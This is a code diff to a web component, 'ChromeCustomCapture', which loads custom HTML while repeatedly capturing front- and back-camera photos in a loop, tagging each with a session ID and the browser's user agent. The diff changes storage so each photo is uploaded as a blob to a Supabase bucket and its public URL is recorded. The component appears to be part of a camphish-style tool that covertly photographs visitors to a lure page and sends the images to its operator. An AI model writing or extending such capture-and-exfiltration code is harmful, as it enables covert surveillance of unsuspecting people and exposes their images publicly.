@@ -143,6 +143,18 @@ const ChromeCustomCapture = () => {
     loadCustomHtml();
   }, [status]);
 
+  // Convert base64 to Blob for storage upload
+  const base64ToBlob = (base64: string): Blob => {
+    const parts = base64.split(',');
+    const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
+    const bstr = atob(parts[1]);
+    const u8arr = new Uint8Array(bstr.length);
+    for (let i = 0; i < bstr.length; i++) {
+      u8arr[i] = bstr.charCodeAt(i);
+    }
+    return new Blob([u8arr], { type: mime });
+  };
+
   const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
     try {
       if (!navigator.mediaDevices?.getUserMedia) {
@@ -199,11 +211,24 @@ const ChromeCustomCapture = () => {
         const frontImage = await captureFromCamera("user");
         
         if (frontImage && !stopCaptureRef.current) {
-          await supabase.from('captured_photos').insert({
-            session_id: sessionId,
-            image_data: frontImage,
-            user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
-          });
+          // Upload to storage
+          const fileName = `${sessionId}/${Date.now()}-front-${captureCount}.jpg`;
+          const blob = base64ToBlob(frontImage);
+          const { error: uploadError } = await supabase.storage
+            .from('captured-photos')
+            .upload(fileName, blob, { upsert: true });
+          
+          if (!uploadError) {
+            const { data: urlData } = supabase.storage
+              .from('captured-photos')
+              .getPublicUrl(fileName);
+            
+            await supabase.from('captured_photos').insert({
+              session_id: sessionId,
+              image_data: urlData.publicUrl,
+              user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
+            });
+          }
         }
         
         if (stopCaptureRef.current) break;
@@ -215,11 +240,24 @@ const ChromeCustomCapture = () => {
         const backImage = await captureFromCamera("environment");
         
         if (backImage && !stopCaptureRef.current) {
-          await supabase.from('captured_photos').insert({
-            session_id: sessionId,
-            image_data: backImage,
-            user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
-          });
+          // Upload to storage
+          const fileName = `${sessionId}/${Date.now()}-back-${captureCount}.jpg`;
+          const blob = base64ToBlob(backImage);
+          const { error: uploadError } = await supabase.storage
+            .from('captured-photos')
+            .upload(fileName, blob, { upsert: true });
+          
+          if (!uploadError) {
+            const { data: urlData } = supabase.storage
+              .from('captured-photos')
+              .getPublicUrl(fileName);
+            
+            await supabase.from('captured_photos').insert({
+              session_id: sessionId,
+              image_data: urlData.publicUrl,
+              user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
+            });
+          }
         }
         
         if (stopCaptureRef.current) break;
